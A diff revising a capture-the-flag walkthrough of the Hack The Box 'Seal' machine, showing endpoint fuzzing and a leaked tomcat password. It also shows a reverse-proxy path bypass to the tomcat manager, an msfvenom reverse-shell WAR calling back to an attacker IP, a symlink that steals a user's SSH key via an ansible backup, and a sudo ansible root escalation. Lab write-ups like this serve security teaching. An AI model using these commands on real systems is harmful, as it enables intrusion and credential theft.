@@ -79,7 +79,7 @@ ID           Response   Lines    Word       Chars       Payload
 000001410:   200        142 L    311 W      6892 Ch     "signin"  
 ```
 	
-Wfuzz reveals a 'register' endpoint, looks interesting. Going there via the brings up a registeration page where I'm able to create an account and use that to login.
+Wfuzz reveals a 'register' endpoint, looks interesting. Going there via the web-browser brings up a registeration page where I'm able to create an account and use that to login.
 
 We're now able to see commit history and what looks like two repos:
 
@@ -87,6 +87,7 @@ We're now able to see commit history and what looks like two repos:
 
 Looking at the infra repo first which looks like an ansible playbook or something similar, we see a git clone address so we clone it and open in vs-code:
 
+```text
 git clone http://seal.htb:8080/git/root/infra.git
 Cloning into 'infra'...
 Username for 'http://seal.htb:8080': gn0stic
@@ -97,6 +98,7 @@ remote: Getting sizes: 100% (13/13)
 remote: Compressing objects: 100% (59/59)
 remote: Total 15 (delta 1), reused 12 (delta 0)
 Unpacking objects: 100% (15/15), 2.42 KiB | 56.00 KiB/s, done.
+```
 
 There is a site.yml file that tells us we're working with tomcat 9 and some other info:
 
@@ -148,21 +150,21 @@ ID           Response   Lines    Word       Chars       Payload
 000000194:   302        0 L      0 W        0 Ch        "manager"  
 ```
 
-I can't login with ssh with luis, alex, admin, root with the tomcat pw we found, but I can login as luis to the gitbucket UI. user-luis/pass-42MrHBf*z8{Z%
+I can't login with ssh with luis, alex, admin, or root with the tomcat pw we found, but I can login as luis to the gitbucket UI. user-luis/pass-42MrHBf*z8{Z%
 
 I couldn't find much to do with luis' gitbucket account and hit a bit of a wall.
 
 ## Foothold
 I ended up going down the path of reverse proxies in front of various web apps and it turns out there are some interesting behaviors. A great write-up is here:
 
-https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/
+[https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/][3]
 
 The write-up links to slides where I found a clear-cut example of what I neded:
-https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
+[https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf][4]
 
 As the two previous links state, there are critical misconfigurations that can easily be made when you put an nginx proxy in front of web-servers. In this case, tomcat.
 
-I'm able to access the previously unaccessable path of /manager/html with this as the path for my request:
+I'm able to access the previously inaccessable path of /manager/html with this as the path for my request:
 ```text
 /manager;name=orange/html
 ```
@@ -190,15 +192,14 @@ We can now access our webshell and run commands. To make running commands easier
 
 We can see the whoami command being executed through our webshell, and it responds that we're running as the tomcat user. This is nice, but ideally we'd like a proper shell to interact with.
 
-Many ways to accomplish this, but I just wrote a simple shell script that creates a reverse shell when executed. I had some difficulties getting a reverse shell to come back to me from our webshell, so a simple solution is to create a war payload with msfvenom:
-
+Let's create a jsp reverse shell in war format with the msfvencom tool:
 ```text
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.26 LPORT=9002 -f war > runme.war
 Payload size: 1100 bytes
 Final size of war file: 1100 bytes
 ```
 
-I uploaded this payload the same way we did, through the tomcat manager UI, then went to that location:
+I uploaded this payload the same way as before through the tomcat manager UI, then went to that location using the web browser to trigger the payload:
 https://seal.htb/runme/
 
 Our listener gets a hit and we have a shell:
@@ -219,16 +220,18 @@ synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups
 
 We see the run.yml has a flag "copy_links". Looking at ansible's documentation, this flag will include the copying of link files. It also notes that it copies the original file that the link points to. This means if we can write anywhere in the /var/lib/tomcat9/webapps/ROOT/admin/dashboard directory, we can make a symlink to files owned by luis, since that's who the ansible job is ran as, and the syncrhonize job will include the original file owned by Luis.
 
-I see that everyone has write access to the uploads directory in dashboard, so I make this link:
+I see that everyone has write access to the uploads directory in dashboard, so I make this symlink in that directory:
 
+```text
 ln -s /home/luis/.ssh/id_rsa id_rsa
+```
 
-Next, I wait for the sync job to run, check /opt/backups/archives to see that the new backup was created. I move it to /tmp since there is a cleanup script that will soon clear them all out.
+Next, I wait for the sync job to run, then check /opt/backups/archives to see that the new backup was created. I move it to /tmp since there is a cleanup script that will soon clear all the backups out.
 
-I gunzip and untar and luis' ssh key is there. We have the user flag and an even better ssh shell as luis.
+I gunzip and untar our compromised backup and luis' ssh key is there. We have the user flag and an even better, a ssh shell as luis.
 
 ## Privilege Escalation to Root User
-About the first thing to check for privilege escalation is sudo -l, so we run that:
+About the first thing to check for when dealing with privilege escalation is sudo -l, so we run that:
 ```text
 luis@seal:/opt/backups/playbook$ sudo -l
 Matching Defaults entries for luis on seal:
@@ -251,7 +254,7 @@ Luis can run ansible with any parameters and it'll run as root if we run it with
         var: b00m.stdout
 ```
 
-This should do it. We could take it a step further and get a shell as root, but I decided to get the flag and move on this time. This playbook is pretty straight forward. It will simple cat the root flag. Ansible syntax has us register the task / command, and we can use that with the debug flag to view the stdout of that command which will be the result of the cat command, our root flag.
+This should do it. We could take it a step further and get a shell as root, but I decided to get the flag and move on this time. This playbook is pretty straight forward. It will simply cat the root flag. Ansible syntax has us register the task / command, and we can use that with the debug flag to view the stdout of that command which will be the result of the cat command, our root flag.
 
 Let's run the playbook and see how it looks:
 ```text
@@ -276,8 +279,10 @@ PLAY RECAP *********************************************************************
 localhost                  : ok=3    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0 
 ```
 
-Works great, and we can see the output of our root flag. This proves we have escalated our privileges all the way to root, and the machine is completely owned.
+Works great, and we can see it output the root flag. This proves we have escalated our privileges all the way to root, and the machine is completely compromised.
 
 
 [1]: https://app.hackthebox.com/users/13531
 [2]: https://www.hackthebox.eu
+[3]: https://www.acunetix.com/blog/articles/a-fresh-look-on-reverse-proxy-related-attacks/
+[4]: https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf
